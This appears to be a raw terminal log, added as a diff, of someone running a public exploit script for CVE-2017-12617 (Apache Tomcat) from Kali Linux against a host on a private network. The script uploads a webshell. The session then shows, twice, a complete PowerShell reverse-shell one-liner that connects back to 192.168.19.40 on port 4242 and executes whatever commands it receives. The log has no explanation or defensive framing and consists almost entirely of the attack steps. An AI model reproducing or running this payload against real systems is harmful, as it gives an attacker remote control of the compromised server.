@@ -1,0 +1,77 @@
+kali@kali:~$ cd Downloads/
+kali@kali:~/Downloads$ python 42966.py 
+
+
+
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
+                                                                           
+                                                                           
+
+
+./cve-2017-12617.py [options]
+
+options:
+
+-u ,--url [::] check target url if it's vulnerable 
+-p,--pwn  [::] generate webshell and upload it
+-l,--list [::] hosts list
+
+[+]usage:
+
+./cve-2017-12617.py -u http://127.0.0.1
+./cve-2017-12617.py --url http://127.0.0.1
+./cve-2017-12617.py -u http://127.0.0.1 -p pwn
+./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn
+./cve-2017-12617.py -l hotsts.txt
+./cve-2017-12617.py --list hosts.txt
+
+
+[@intx0x80]
+
+
+kali@kali:~/Downloads$ python 42966.py -u http://192.168.40.42:8080 -p pwn
+
+                                                                                                                                                         
+                                                                                                                                                         
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                               
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                              
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                               
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                 
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                  
+                                                                                                                                                         
+                                                                                                                                                         
+                                                                                                                                                         
+[@intx0x80]                                                                                                                                              
+                                                                                                                                                         
+                                                                                                                                                         
+Uploading Webshell .....
+$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.19.40',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+^[[A
+^C
+[-] Exiting                                                                                                                                              
+^[[Akali@kali:~/Downloads$ python 42966.py -u http://192.168.40.42:8080 -p pwn
+
+                                                                                                                                                         
+                                                                                                                                                         
+   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                               
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                              
+ | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                               
+ | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                
+ | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                 
+  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                  
+                                                                                                                                                         
+                                                                                                                                                         
+                                                                                                                                                         
+[@intx0x80]                                                                                                                                              
+                                                                                                                                                         
+                                                                                                                                                         
+Uploading Webshell .....
+$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.19.40',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
